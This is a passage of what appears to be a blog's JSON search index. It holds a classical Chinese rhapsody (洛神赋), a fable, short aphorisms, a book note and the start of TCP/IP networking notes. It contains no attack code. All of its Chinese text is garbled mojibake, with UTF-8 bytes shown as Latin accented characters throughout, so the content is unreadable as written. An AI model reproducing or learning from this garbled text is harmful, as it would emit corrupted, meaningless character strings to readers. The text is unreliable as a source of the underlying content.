ç²¾ç§»ç¥éª‡ï¼Œå¿½ç„‰æ€æ•£ã€‚ä¿¯åˆ™æœªå¯Ÿï¼Œä»°ä»¥æ®Šè§‚ã€‚ç¹ä¸€ä¸½äººï¼Œäºå²©ä¹‹ç•”ã€‚ä¹ƒæ´å¾¡è€…è€Œå‘Šä¹‹æ›°ï¼šâ€œå°”æœ‰è§Œäºå½¼è€…ä¹ï¼Ÿå½¼ä½•äººæ–¯ï¼Œè‹¥æ­¤ä¹‹è‰³ä¹Ÿï¼â€å¾¡è€…å¯¹æ›°ï¼šâ€œè‡£é—»æ²³æ´›ä¹‹ç¥ï¼Œåæ›°å®“å¦ƒã€‚ç„¶åˆ™å›ç‹ä¹‹æ‰€è§ï¼Œæ— ä¹ƒæ˜¯ä¹ï¼å…¶çŠ¶è‹¥ä½•ï¼Ÿè‡£æ„¿é—»ä¹‹ã€‚â€\nä½™å‘Šä¹‹æ›°ï¼šå…¶å½¢ä¹Ÿï¼Œç¿©è‹¥æƒŠé¸¿ï¼Œå©‰è‹¥æ¸¸é¾™ã€‚è£æ›œç§‹èŠï¼ŒåèŒ‚æ˜¥æ¾ã€‚é«£é«´å…®è‹¥è½»äº‘ä¹‹è”½æœˆï¼Œé£˜é£–å…®è‹¥æµé£ä¹‹å›é›ªã€‚è¿œè€Œæœ›ä¹‹ï¼Œçšè‹¥å¤ªé˜³å‡æœéœï¼›è¿«è€Œå¯Ÿä¹‹ï¼Œç¼è‹¥èŠ™è•–å‡ºæ¸Œæ³¢ã€‚ç§¾çº¤å¾—ä¸­ï¼Œä¿®çŸ­åˆåº¦ã€‚è‚©è‹¥å‰Šæˆï¼Œè…°å¦‚çº¦ç´ ã€‚å»¶é¢ˆç§€é¡¹ï¼Œçš“è´¨å‘ˆéœ²ã€‚èŠ³æ³½æ— åŠ ï¼Œé“…åå¼—å¾¡ã€‚äº‘é«»å³¨å³¨ï¼Œä¿®çœ‰è”å¨Ÿã€‚ä¸¹å”‡å¤–æœ—ï¼Œçš“é½¿å†…é²œã€‚æ˜çœ¸å–„çï¼Œé¥è¾…æ‰¿æƒã€‚ç“Œå§¿è‰³é€¸ï¼Œä»ªé™ä½“é—²ã€‚æŸ”æƒ…ç»°æ€ï¼Œåªšäºè¯­è¨€ã€‚å¥‡æœæ—·ä¸–ï¼Œéª¨åƒåº”å›¾ã€‚æŠ«ç½—è¡£ä¹‹ç’€ç²²å…®ï¼Œç¥ç‘¶ç¢§ä¹‹åçšã€‚æˆ´é‡‘ç¿ ä¹‹é¦–é¥°ï¼Œç¼€æ˜ç ä»¥è€€èº¯ã€‚è·µè¿œæ¸¸ä¹‹æ–‡å±¥ï¼Œæ›³é›¾ç»¡ä¹‹è½»è£¾ã€‚å¾®å¹½å…°ä¹‹èŠ³è”¼å…®ï¼Œæ­¥è¸Ÿè¹°äºå±±éš…ã€‚äºæ˜¯å¿½ç„‰çºµä½“ï¼Œä»¥é¨ä»¥å¬‰ã€‚å·¦å€šé‡‡æ—„ï¼Œå³è«æ¡‚æ——ã€‚æ”˜çš“è…•äºç¥æµ’å…®ï¼Œé‡‡æ¹æ¿‘ä¹‹ç„èŠã€‚\nä½™æƒ…æ‚¦å…¶æ·‘ç¾å…®ï¼Œå¿ƒæŒ¯è¡è€Œä¸æ€¡ã€‚æ— è‰¯åª’ä»¥æ¥æ¬¢å…®ï¼Œæ‰˜å¾®æ³¢è€Œé€šè¾ã€‚æ„¿è¯šç´ ä¹‹å…ˆè¾¾å…®ï¼Œè§£ç‰ä½©ä»¥è¦ä¹‹ã€‚å—Ÿä½³äººä¹‹ä¿¡ä¿®ï¼Œç¾Œä¹ ç¤¼è€Œæ˜è¯—ã€‚æŠ—ç¼ç¶ä»¥å’Œäºˆå…®ï¼ŒæŒ‡æ½œæ¸Šè€Œä¸ºæœŸã€‚æ‰§çœ·çœ·ä¹‹æ¬¾å®å…®ï¼Œæƒ§æ–¯çµä¹‹æˆ‘æ¬ºã€‚æ„Ÿäº¤ç”«ä¹‹å¼ƒè¨€å…®ï¼Œæ€…çŠ¹è±«è€Œç‹ç–‘ã€‚æ”¶å’Œé¢œè€Œé™å¿—å…®ï¼Œç”³ç¤¼é˜²ä»¥è‡ªæŒã€‚\näºæ˜¯æ´›çµæ„Ÿç„‰ï¼Œå¾™å€šå½·å¾¨ã€‚ç¥å…‰ç¦»åˆï¼Œä¹é˜´ä¹é˜³ã€‚ç«¦è½»èº¯ä»¥é¹¤ç«‹ï¼Œè‹¥å°†é£è€Œæœªç¿”ã€‚è·µæ¤’é€”ä¹‹éƒçƒˆï¼Œæ­¥è˜…è–„è€ŒæµèŠ³ã€‚è¶…é•¿åŸä»¥æ°¸æ…•å…®ï¼Œå£°å“€å‰è€Œå¼¥é•¿ã€‚å°”ä¹ƒä¼—çµæ‚æ²“ï¼Œå‘½ä¿¦å•¸ä¾£ã€‚æˆ–æˆæ¸…æµï¼Œæˆ–ç¿”ç¥æ¸šï¼Œæˆ–é‡‡æ˜ç ï¼Œæˆ–æ‹¾ç¿ ç¾½ã€‚ä»å—æ¹˜ä¹‹äºŒå¦ƒï¼Œæºæ±‰æ»¨ä¹‹æ¸¸å¥³ã€‚å¹åŒç“œä¹‹æ— åŒ¹å…®ï¼Œå’ç‰µç‰›ä¹‹ç‹¬å¤„ã€‚æ‰¬è½»è¢¿ä¹‹çŒ—é¡å…®ï¼Œç¿³ä¿®è¢–ä»¥å»¶ä¼«ã€‚ä½“è¿…é£å‡«ï¼Œé£˜å¿½è‹¥ç¥ã€‚**å‡Œæ³¢å¾®æ­¥ï¼Œç½—è¢œç”Ÿå°˜ã€‚**åŠ¨æ— å¸¸åˆ™ï¼Œè‹¥å±è‹¥å®‰ï¼›è¿›æ­¢éš¾æœŸï¼Œè‹¥å¾€è‹¥è¿˜ã€‚è½¬çœ„æµç²¾ï¼Œå…‰æ¶¦ç‰é¢œã€‚å«è¾æœªåï¼Œæ°”è‹¥å¹½å…°ã€‚åå®¹å©€å¨œï¼Œä»¤æˆ‘å¿˜é¤ã€‚\näºæ˜¯å±ç¿³æ”¶é£ï¼Œå·åé™æ³¢ã€‚å†¯å¤·é¸£é¼“ï¼Œå¥³å¨²æ¸…æ­Œã€‚è…¾æ–‡é±¼ä»¥è­¦ä¹˜ï¼Œé¸£ç‰éŠ®ä»¥å•é€ã€‚å…­é¾™ä¿¨å…¶é½é¦–ï¼Œè½½äº‘è½¦ä¹‹å®¹è£”ã€‚é²¸é²µè¸Šè€Œå¤¹æ¯‚ï¼Œæ°´ç¦½ç¿”è€Œä¸ºå«ã€‚äºæ˜¯è¶ŠåŒ—æ²šï¼Œè¿‡å—å†ˆï¼Œçº¡ç´ é¢†ï¼Œå›æ¸…æ‰¬ã€‚åŠ¨æœ±å”‡ä»¥å¾è¨€ï¼Œé™ˆäº¤æ¥ä¹‹å¤§çº²ã€‚æ¨äººç¥ä¹‹é“æ®Šå…®ï¼Œæ€¨ç››å¹´ä¹‹è«å½“ã€‚æŠ—ç½—è¢‚ä»¥æ©æ¶•å…®ï¼Œæ³ªæµè¥Ÿä¹‹æµªæµªã€‚æ‚¼è‰¯ä¼šä¹‹æ°¸ç»å…®ï¼Œå“€ä¸€é€è€Œå¼‚ä¹¡ã€‚æ— å¾®æƒ…ä»¥æ•ˆçˆ±å…®ï¼ŒçŒ®æ±Ÿå—ä¹‹æ˜ç°ã€‚è™½æ½œå¤„äºå¤ªé˜´ï¼Œé•¿å¯„å¿ƒäºå›ç‹ã€‚å¿½ä¸æ‚Ÿå…¶æ‰€èˆï¼Œæ€…ç¥å®µè€Œè”½å…‰ã€‚\näºæ˜¯èƒŒä¸‹é™µé«˜ï¼Œè¶³å¾€ç¥ç•™ã€‚é—æƒ…æƒ³åƒï¼Œé¡¾æœ›æ€€æ„ã€‚å†€çµä½“ä¹‹å¤å½¢ï¼Œå¾¡è½»èˆŸè€Œä¸Šæº¯ã€‚æµ®é•¿å·è€Œå¿˜åï¼Œæ€ç»µç»µè€Œå¢æ…•ã€‚å¤œè€¿è€¿è€Œä¸å¯ï¼Œæ²¾ç¹éœœè€Œè‡³æ›™ã€‚å‘½ä»†å¤«è€Œå°±é©¾ï¼Œå¾å°†å½’ä¹ä¸œè·¯ã€‚æ½é¨‘è¾”ä»¥æŠ—ç­–ï¼Œæ€…ç›˜æ¡“è€Œä¸èƒ½å»ã€‚\n","permalink":"https://wdd.js.org/posts/2019/11/ck3yzp/","summary":"é»„åˆä¸‰å¹´ï¼Œä½™æœäº¬å¸ˆï¼Œè¿˜æµæ´›å·ã€‚å¤äººæœ‰è¨€ï¼šæ–¯æ°´ä¹‹ç¥ï¼Œåæ›°å®“å¦ƒã€‚æ„Ÿå®‹ç‰å¯¹æ¥šç‹ç¥å¥³ä¹‹äº‹ï¼Œé‚ä½œæ–¯èµ‹ã€‚å…¶è¯æ›°ï¼š\nä½™ä»äº¬åŸŸï¼Œè¨€å½’ä¸œè—©ï¼ŒèƒŒä¼Šé˜™ï¼Œè¶Šè½˜è¾•ï¼Œç»é€šè°·ï¼Œé™µæ™¯å±±ã€‚æ—¥æ—¢è¥¿å€¾ï¼Œè½¦æ®†é©¬çƒ¦ã€‚å°”ä¹ƒç¨é©¾ä¹è˜…çš‹ï¼Œç§£é©·ä¹èŠç”°ï¼Œå®¹ä¸ä¹é˜³æ—ï¼Œæµçœ„ä¹æ´›å·ã€‚äºæ˜¯ç²¾ç§»ç¥éª‡ï¼Œå¿½ç„‰æ€æ•£ã€‚ä¿¯åˆ™æœªå¯Ÿï¼Œä»°ä»¥æ®Šè§‚ã€‚ç¹ä¸€ä¸½äººï¼Œäºå²©ä¹‹ç•”ã€‚ä¹ƒæ´å¾¡è€…è€Œå‘Šä¹‹æ›°ï¼šâ€œå°”æœ‰è§Œäºå½¼è€…ä¹ï¼Ÿå½¼ä½•äººæ–¯ï¼Œè‹¥æ­¤ä¹‹è‰³ä¹Ÿï¼â€å¾¡è€…å¯¹æ›°ï¼šâ€œè‡£é—»æ²³æ´›ä¹‹ç¥ï¼Œåæ›°å®“å¦ƒã€‚ç„¶åˆ™å›ç‹ä¹‹æ‰€è§ï¼Œæ— ä¹ƒæ˜¯ä¹ï¼å…¶çŠ¶è‹¥ä½•ï¼Ÿè‡£æ„¿é—»ä¹‹ã€‚â€\nä½™å‘Šä¹‹æ›°ï¼šå…¶å½¢ä¹Ÿï¼Œç¿©è‹¥æƒŠé¸¿ï¼Œå©‰è‹¥æ¸¸é¾™ã€‚è£æ›œç§‹èŠï¼ŒåèŒ‚æ˜¥æ¾ã€‚é«£é«´å…®è‹¥è½»äº‘ä¹‹è”½æœˆï¼Œé£˜é£–å…®è‹¥æµé£ä¹‹å›é›ªã€‚è¿œè€Œæœ›ä¹‹ï¼Œçšè‹¥å¤ªé˜³å‡æœéœï¼›è¿«è€Œå¯Ÿä¹‹ï¼Œç¼è‹¥èŠ™è•–å‡ºæ¸Œæ³¢ã€‚ç§¾çº¤å¾—ä¸­ï¼Œä¿®çŸ­åˆåº¦ã€‚è‚©è‹¥å‰Šæˆï¼Œè…°å¦‚çº¦ç´ ã€‚å»¶é¢ˆç§€é¡¹ï¼Œçš“è´¨å‘ˆéœ²ã€‚èŠ³æ³½æ— åŠ ï¼Œé“…åå¼—å¾¡ã€‚äº‘é«»å³¨å³¨ï¼Œä¿®çœ‰è”å¨Ÿã€‚ä¸¹å”‡å¤–æœ—ï¼Œçš“é½¿å†…é²œã€‚æ˜çœ¸å–„çï¼Œé¥è¾…æ‰¿æƒã€‚ç“Œå§¿è‰³é€¸ï¼Œä»ªé™ä½“é—²ã€‚æŸ”æƒ…ç»°æ€ï¼Œåªšäºè¯­è¨€ã€‚å¥‡æœæ—·ä¸–ï¼Œéª¨åƒåº”å›¾ã€‚æŠ«ç½—è¡£ä¹‹ç’€ç²²å…®ï¼Œç¥ç‘¶ç¢§ä¹‹åçšã€‚æˆ´é‡‘ç¿ ä¹‹é¦–é¥°ï¼Œç¼€æ˜ç ä»¥è€€èº¯ã€‚è·µè¿œæ¸¸ä¹‹æ–‡å±¥ï¼Œæ›³é›¾ç»¡ä¹‹è½»è£¾ã€‚å¾®å¹½å…°ä¹‹èŠ³è”¼å…®ï¼Œæ­¥è¸Ÿè¹°äºå±±éš…ã€‚äºæ˜¯å¿½ç„‰çºµä½“ï¼Œä»¥é¨ä»¥å¬‰ã€‚å·¦å€šé‡‡æ—„ï¼Œå³è«æ¡‚æ——ã€‚æ”˜çš“è…•äºç¥æµ’å…®ï¼Œé‡‡æ¹æ¿‘ä¹‹ç„èŠã€‚\nä½™æƒ…æ‚¦å…¶æ·‘ç¾å…®ï¼Œå¿ƒæŒ¯è¡è€Œä¸æ€¡ã€‚æ— è‰¯åª’ä»¥æ¥æ¬¢å…®ï¼Œæ‰˜å¾®æ³¢è€Œé€šè¾ã€‚æ„¿è¯šç´ ä¹‹å…ˆè¾¾å…®ï¼Œè§£ç‰ä½©ä»¥è¦ä¹‹ã€‚å—Ÿä½³äººä¹‹ä¿¡ä¿®ï¼Œç¾Œä¹ ç¤¼è€Œæ˜è¯—ã€‚æŠ—ç¼ç¶ä»¥å’Œäºˆå…®ï¼ŒæŒ‡æ½œæ¸Šè€Œä¸ºæœŸã€‚æ‰§çœ·çœ·ä¹‹æ¬¾å®å…®ï¼Œæƒ§æ–¯çµä¹‹æˆ‘æ¬ºã€‚æ„Ÿäº¤ç”«ä¹‹å¼ƒè¨€å…®ï¼Œæ€…çŠ¹è±«è€Œç‹ç–‘ã€‚æ”¶å’Œé¢œè€Œé™å¿—å…®ï¼Œç”³ç¤¼é˜²ä»¥è‡ªæŒã€‚\näºæ˜¯æ´›çµæ„Ÿç„‰ï¼Œå¾™å€šå½·å¾¨ã€‚ç¥å…‰ç¦»åˆï¼Œä¹é˜´ä¹é˜³ã€‚ç«¦è½»èº¯ä»¥é¹¤ç«‹ï¼Œè‹¥å°†é£è€Œæœªç¿”ã€‚è·µæ¤’é€”ä¹‹éƒçƒˆï¼Œæ­¥è˜…è–„è€ŒæµèŠ³ã€‚è¶…é•¿åŸä»¥æ°¸æ…•å…®ï¼Œå£°å“€å‰è€Œå¼¥é•¿ã€‚å°”ä¹ƒä¼—çµæ‚æ²“ï¼Œå‘½ä¿¦å•¸ä¾£ã€‚æˆ–æˆæ¸…æµï¼Œæˆ–ç¿”ç¥æ¸šï¼Œæˆ–é‡‡æ˜ç ï¼Œæˆ–æ‹¾ç¿ ç¾½ã€‚ä»å—æ¹˜ä¹‹äºŒå¦ƒï¼Œæºæ±‰æ»¨ä¹‹æ¸¸å¥³ã€‚å¹åŒç“œä¹‹æ— åŒ¹å…®ï¼Œå’ç‰µç‰›ä¹‹ç‹¬å¤„ã€‚æ‰¬è½»è¢¿ä¹‹çŒ—é¡å…®ï¼Œç¿³ä¿®è¢–ä»¥å»¶ä¼«ã€‚ä½“è¿…é£å‡«ï¼Œé£˜å¿½è‹¥ç¥ã€‚**å‡Œæ³¢å¾®æ­¥ï¼Œç½—è¢œç”Ÿå°˜ã€‚**åŠ¨æ— å¸¸åˆ™ï¼Œè‹¥å±è‹¥å®‰ï¼›è¿›æ­¢éš¾æœŸï¼Œè‹¥å¾€è‹¥è¿˜ã€‚è½¬çœ„æµç²¾ï¼Œå…‰æ¶¦ç‰é¢œã€‚å«è¾æœªåï¼Œæ°”è‹¥å¹½å…°ã€‚åå®¹å©€å¨œï¼Œä»¤æˆ‘å¿˜é¤ã€‚\näºæ˜¯å±ç¿³æ”¶é£ï¼Œå·åé™æ³¢ã€‚å†¯å¤·é¸£é¼“ï¼Œå¥³å¨²æ¸…æ­Œã€‚è…¾æ–‡é±¼ä»¥è­¦ä¹˜ï¼Œé¸£ç‰éŠ®ä»¥å•é€ã€‚å…­é¾™ä¿¨å…¶é½é¦–ï¼Œè½½äº‘è½¦ä¹‹å®¹è£”ã€‚é²¸é²µè¸Šè€Œå¤¹æ¯‚ï¼Œæ°´ç¦½ç¿”è€Œä¸ºå«ã€‚äºæ˜¯è¶ŠåŒ—æ²šï¼Œè¿‡å—å†ˆï¼Œçº¡ç´ é¢†ï¼Œå›æ¸…æ‰¬ã€‚åŠ¨æœ±å”‡ä»¥å¾è¨€ï¼Œé™ˆäº¤æ¥ä¹‹å¤§çº²ã€‚æ¨äººç¥ä¹‹é“æ®Šå…®ï¼Œæ€¨ç››å¹´ä¹‹è«å½“ã€‚æŠ—ç½—è¢‚ä»¥æ©æ¶•å…®ï¼Œæ³ªæµè¥Ÿä¹‹æµªæµªã€‚æ‚¼è‰¯ä¼šä¹‹æ°¸ç»å…®ï¼Œå“€ä¸€é€è€Œå¼‚ä¹¡ã€‚æ— å¾®æƒ…ä»¥æ•ˆçˆ±å…®ï¼ŒçŒ®æ±Ÿå—ä¹‹æ˜ç°ã€‚è™½æ½œå¤„äºå¤ªé˜´ï¼Œé•¿å¯„å¿ƒäºå›ç‹ã€‚å¿½ä¸æ‚Ÿå…¶æ‰€èˆï¼Œæ€…ç¥å®µè€Œè”½å…‰ã€‚\näºæ˜¯èƒŒä¸‹é™µé«˜ï¼Œè¶³å¾€ç¥ç•™ã€‚é—æƒ…æƒ³åƒï¼Œé¡¾æœ›æ€€æ„ã€‚å†€çµä½“ä¹‹å¤å½¢ï¼Œå¾¡è½»èˆŸè€Œä¸Šæº¯ã€‚æµ®é•¿å·è€Œå¿˜åï¼Œæ€ç»µç»µè€Œå¢æ…•ã€‚å¤œè€¿è€¿è€Œä¸å¯ï¼Œæ²¾ç¹éœœè€Œè‡³æ›™ã€‚å‘½ä»†å¤«è€Œå°±é©¾ï¼Œå¾å°†å½’ä¹ä¸œè·¯ã€‚æ½é¨‘è¾”ä»¥æŠ—ç­–ï¼Œæ€…ç›˜æ¡“è€Œä¸èƒ½å»ã€‚","title":"æ´›ç¥èµ‹"},{"content":"æœ‰ä¸¤ç§é€‰æ‹©ï¼Œè¦ä¹ˆè¢«å¿½æ‚ æˆéŸ­èœè¢«åˆ«äººå‰²ï¼Œè¦ä¹ˆå‰²åˆ«çƒ­çš„éŸ­èœã€‚\n","permalink":"https://wdd.js.org/posts/2019/11/blqt1k/","summary":"æœ‰ä¸¤ç§é€‰æ‹©ï¼Œè¦ä¹ˆè¢«å¿½æ‚ æˆéŸ­èœè¢«åˆ«äººå‰²ï¼Œè¦ä¹ˆå‰²åˆ«çƒ­çš„éŸ­èœã€‚","title":"å‰²éŸ­èœ"},{"content":" â€œç‹™å…¬èµ‹èŠ§ï¼Œæ›°ï¼š\u0026lsquo;æœä¸‰è€Œæš®å››ã€‚\u0026lsquo;ä¼—ç‹™çš†æ€’ã€‚æ›°ï¼š\u0026lsquo;ç„¶åˆ™æœå››è€Œæš®ä¸‰ã€‚\u0026lsquo;ä¼—ç‹™çš†æ‚¦ã€‚åå®æœªäºè€Œå–œæ€’ä¸ºç”¨ï¼Œäº¦å› æ˜¯ä¹Ÿã€‚ã€Šåº„å­â€”é½ç‰©è®ºã€‹\næœ‰ä¸ªäººå…»çŒ´å­ï¼Œæ¯å¤©æ—©ä¸Šå–‚ç»™æ¯ä¸ªçŒ´å­ä¸‰é¢—æ£ï¼Œä¸‹åˆæ¯ä¸ªçŒ´å­å–‚å››é¢—æ£ã€‚\næœ‰ä¸€å¤©ä»–çªç„¶æƒ³æç‚¹äº‹æƒ…ï¼Œå°±å¯¹çŒ´å­è¯´ï¼šä»ä»Šä»¥åï¼Œæ¯å¤©æ—©ä¸Šæ¯äººç»™ä½ ä»¬å››é¢—æ£ï¼Œä¸‹åˆæ¯äººç»™ä½ ä»¬ä¸‰é¢—æ£ï¼Œä½ ä»¬è¯´å¥½ä¸å¥½ï¼Ÿ\nçŒ´å­ä»¬ä¸Šè¹¿ä¸‹è·³ï¼Œæ€’å‘å†²å† ï¼Œç”Ÿæ°”çš„è¯´ï¼šä¸è¡Œï¼ä¸è¡Œï¼é‚£æ€ä¹ˆè¡Œå‘¢ï¼Ÿ\nå…»çŒ´å­äººæ‘†æ‘†æ‰‹ï¼Œå’Œæ°”çš„è¯´ï¼šå¥½å§ï¼Œå¥½å§ï¼Œè¿˜æŒ‰ç…§ä»¥å‰æ–¹å¼æ¥ã€‚\nçŒ´å­ä»¬å¾ˆæ»¡æ„ï¼Œç¬¼å­é‡Œå……æ»¡ç¥¥å’Œçš„ç©ºæ°”~\n","permalink":"https://wdd.js.org/posts/2019/11/urkvnz/","summary":"â€œç‹™å…¬èµ‹èŠ§ï¼Œæ›°ï¼š\u0026lsquo;æœä¸‰è€Œæš®å››ã€‚\u0026lsquo;ä¼—ç‹™çš†æ€’ã€‚æ›°ï¼š\u0026lsquo;ç„¶åˆ™æœå››è€Œæš®ä¸‰ã€‚\u0026lsquo;ä¼—ç‹™çš†æ‚¦ã€‚åå®æœªäºè€Œå–œæ€’ä¸ºç”¨ï¼Œäº¦å› æ˜¯ä¹Ÿã€‚ã€Šåº„å­â€”é½ç‰©è®ºã€‹\næœ‰ä¸ªäººå…»çŒ´å­ï¼Œæ¯å¤©æ—©ä¸Šå–‚ç»™æ¯ä¸ªçŒ´å­ä¸‰é¢—æ£ï¼Œä¸‹åˆæ¯ä¸ªçŒ´å­å–‚å››é¢—æ£ã€‚\næœ‰ä¸€å¤©ä»–çªç„¶æƒ³æç‚¹äº‹æƒ…ï¼Œå°±å¯¹çŒ´å­è¯´ï¼šä»ä»Šä»¥åï¼Œæ¯å¤©æ—©ä¸Šæ¯äººç»™ä½ ä»¬å››é¢—æ£ï¼Œä¸‹åˆæ¯äººç»™ä½ ä»¬ä¸‰é¢—æ£ï¼Œä½ ä»¬è¯´å¥½ä¸å¥½ï¼Ÿ\nçŒ´å­ä»¬ä¸Šè¹¿ä¸‹è·³ï¼Œæ€’å‘å†²å† ï¼Œç”Ÿæ°”çš„è¯´ï¼šä¸è¡Œï¼ä¸è¡Œï¼é‚£æ€ä¹ˆè¡Œå‘¢ï¼Ÿ\nå…»çŒ´å­äººæ‘†æ‘†æ‰‹ï¼Œå’Œæ°”çš„è¯´ï¼šå¥½å§ï¼Œå¥½å§ï¼Œè¿˜æŒ‰ç…§ä»¥å‰æ–¹å¼æ¥ã€‚\nçŒ´å­ä»¬å¾ˆæ»¡æ„ï¼Œç¬¼å­é‡Œå……æ»¡ç¥¥å’Œçš„ç©ºæ°”~","title":"æœä¸‰æš®å››"},{"content":" å†·é£å¦‚åˆ€ï¼Œä»¥å¤§åœ°ä¸ºç §æ¿ï¼Œè§†ä¼—ç”Ÿä¸ºé±¼è‚‰ã€‚ä¸‡é‡Œé£é›ªï¼Œå°†è‹ç©¹ä½œæ´ªç‚‰ï¼Œæº¶ä¸‡ç‰©ä¸ºç™½é“¶ ã€Šå¤šæƒ…å‰‘å®¢æ— æƒ…å‰‘ã€‹\n","permalink":"https://wdd.js.org/posts/2019/11/kug5fo/","summary":"å†·é£å¦‚åˆ€ï¼Œä»¥å¤§åœ°ä¸ºç §æ¿ï¼Œè§†ä¼—ç”Ÿä¸ºé±¼è‚‰ã€‚ä¸‡é‡Œé£é›ªï¼Œå°†è‹ç©¹ä½œæ´ªç‚‰ï¼Œæº¶ä¸‡ç‰©ä¸ºç™½é“¶ ã€Šå¤šæƒ…å‰‘å®¢æ— æƒ…å‰‘ã€‹","title":"ä¼—ç”Ÿé±¼è‚‰"},{"content":"æˆ‘ä»¥å‰çœ‹è¿‡ç‹å¿—åˆšçš„ä¸€æœ¬ä¹¦ã€Šç¬¬ä¸‰ç§ç”Ÿå­˜ã€‹ï¼Œè§‰å¾—è›®æœ‰æ„æ€çš„ã€‚\nä¾èµ–äºæƒåˆ©é˜¶å±‚ã€‚ä¾‹å¦‚å½“å®˜ ä¾èµ–äºè´¢å¯Œé˜¶å±‚ã€‚ä¾‹å¦‚æ‰“å·¥ å¤§éƒ¨åˆ†äººå…¶å®éƒ½åœ¨ä¾èµ–æƒåˆ©é˜¶å±‚æˆ–è€…è´¢å¯Œé˜¶å±‚åœ¨ç”Ÿå­˜ï¼Œèƒ½å¤Ÿè·³å‡ºçš„äººè¿™ä¸¤ç§ç”Ÿå­˜æ–¹å¼çš„ï¼Œç§°ä¹‹ä¸ºç¬¬ä¸‰ç§ç”Ÿå­˜ã€‚\nç¬¬ä¸‰ç§ç”Ÿå­˜æ–¹å¼ï¼Œæ˜¯è®²è‡ªå·±æ‰“é€ æˆæŸä¸ªé¢†åŸŸä¸­ä¸“å®¶çº§åˆ«çš„äººç‰©ã€‚\nç§°ä¸ºä¸“å®¶ï¼Œç§°ä¸ºå¤§å¤šæ•°ä¸­çš„å°‘æ•°äººã€‚ç‰©ä»¥ç¨€ä¸ºè´µï¼Œäººäº¦å¦‚æ­¤ã€‚\n","permalink":"https://wdd.js.org/posts/2019/11/gn4aak/","summary":"æˆ‘ä»¥å‰çœ‹è¿‡ç‹å¿—åˆšçš„ä¸€æœ¬ä¹¦ã€Šç¬¬ä¸‰ç§ç”Ÿå­˜ã€‹ï¼Œè§‰å¾—è›®æœ‰æ„æ€çš„ã€‚\nä¾èµ–äºæƒåˆ©é˜¶å±‚ã€‚ä¾‹å¦‚å½“å®˜ ä¾èµ–äºè´¢å¯Œé˜¶å±‚ã€‚ä¾‹å¦‚æ‰“å·¥ å¤§éƒ¨åˆ†äººå…¶å®éƒ½åœ¨ä¾èµ–æƒåˆ©é˜¶å±‚æˆ–è€…è´¢å¯Œé˜¶å±‚åœ¨ç”Ÿå­˜ï¼Œèƒ½å¤Ÿè·³å‡ºçš„äººè¿™ä¸¤ç§ç”Ÿå­˜æ–¹å¼çš„ï¼Œç§°ä¹‹ä¸ºç¬¬ä¸‰ç§ç”Ÿå­˜ã€‚\nç¬¬ä¸‰ç§ç”Ÿå­˜æ–¹å¼ï¼Œæ˜¯è®²è‡ªå·±æ‰“é€ æˆæŸä¸ªé¢†åŸŸä¸­ä¸“å®¶çº§åˆ«çš„äººç‰©ã€‚\nç§°ä¸ºä¸“å®¶ï¼Œç§°ä¸ºå¤§å¤šæ•°ä¸­çš„å°‘æ•°äººã€‚ç‰©ä»¥ç¨€ä¸ºè´µï¼Œäººäº¦å¦‚æ­¤ã€‚","title":"ç¬¬ä¸‰ç§ç”Ÿå­˜"},{"content":"åˆ†å±‚ åº”ç”¨ç¨‹åºä¸€èˆ¬å¤„ç†åº”ç”¨å±‚çš„\n------------------------------------------------------------ åº”ç”¨å±‚ # Telnet, FTP, Email, MySql\t| åº”ç”¨ç¨‹åºç»†èŠ‚\t| ç”¨æˆ·è¿›ç¨‹ ------------------------------------------------------------ è¿è¾“å±‚ # TCP, UDP | å†…æ ¸(å¤„ç†é€šä¿¡ç»†èŠ‚) ç«¯åˆ°ç«¯é€šä¿¡ | ------------------------------------------| ç½‘ç»œå±‚ # IP, ICMP, IGMP\t| é€è·³é€šä¿¡ï¼Œå¤„ç†åˆ†ç»„ç›¸å…³çš„æ´»åŠ¨ï¼Œä¾‹å¦‚åˆ†ç»„é€‰è·¯| ------------------------------------------| é“¾è·¯å±‚ # è®¾å¤‡é©±åŠ¨ç¨‹åº æ¥å£å¡\t| å¤„ç†ç‰©ç†ä¿¡å·\t| ------------------------------------------------------------ åº”ç”¨å±‚å’Œä¼ è¾“å±‚ä½¿ç”¨ç«¯åˆ°ç«¯çš„åè®® ç½‘ç»œå±‚æä¾›é€è·³çš„åè®® ç½‘æ¡¥åœ¨é“¾è·¯å±‚æ¥è¿æ¥ç½‘ç»œ è·¯ç”±å™¨åœ¨ç½‘ç»œå±‚è¿æ¥ç½‘ç»œ ä»¥å¤ªç½‘æ•°æ®å¸§çš„ç‰©ç†ç‰¹æ€§æ˜¯é•¿åº¦å¿…é¡»åœ¨46-1500å­—èŠ‚ä¹‹é—´ å°è£… ä»¥å¤ªç½‘å¸§ç”¨æ¥å°è£…IPæ•°æ®æŠ¥ã€‚\nIPæ•°æ®æŠ¥ = IPé¦–éƒ¨(20å­—èŠ‚) + TCPé¦–éƒ¨(20å­—èŠ‚) + åº”ç”¨æ•°æ® # é’ˆå¯¹TCP IPæ•°æ®æŠ¥ = IPé¦–éƒ¨(20å­—èŠ‚) + UDPé¦–éƒ¨(8å­—èŠ‚) + åº”ç”¨æ•°æ® # é’ˆå¯¹UDP ä»¥å¤ªç½‘å¸§ = ä»¥å¤ªç½‘é¦–éƒ¨(14å­—èŠ‚) + IPæ•°æ®æŠ¥(46-1500å­—èŠ‚) + ä»¥å¤ªç½‘å°¾éƒ¨(4å­—èŠ‚) IPæ•°æ®æŠ¥æœ€å¤§ä¸º1500å­—èŠ‚ï¼Œå‡å»20å­—èŠ‚IPé¦–éƒ¨ï¼Œ8å­—èŠ‚UDPé¦–éƒ¨ï¼Œç•™ç»™UDPåº”ç”¨æ•°æ®çš„åªæœ‰1472å­—èŠ‚ã€‚\n","permalink":"https://wdd.js.org/network/ir1i82/","summary":"åˆ†å±‚ åº”ç”¨ç¨‹åºä¸€èˆ¬å¤„ç†åº”ç”¨å±‚çš„\n------------------------------------------------------------ åº”ç”¨å±‚ # Telnet, FTP, Email, MySql\t| åº”ç”¨ç¨‹åºç»†èŠ‚\t| ç”¨æˆ·è¿›ç¨‹ ------------------------------------------------------------ è¿è¾“å±‚ # TCP, UDP | å†…æ ¸(å¤„ç†é€šä¿¡ç»†èŠ‚) ç«¯åˆ°ç«¯é€šä¿¡ | ------------------------------------------| ç½‘ç»œå±‚ # IP, ICMP, IGMP\t| é€è·³é€šä¿¡ï¼Œå¤„ç†åˆ†ç»„ç›¸å…³çš„æ´»åŠ¨ï¼Œä¾‹å¦‚åˆ†ç»„é€‰è·¯| ------------------------------------------| é“¾è·¯å±‚ # è®¾å¤‡é©±åŠ¨ç¨‹åº æ¥å£å¡\t| å¤„ç†ç‰©ç†ä¿¡å·\t| ------------------------------------------------------------ 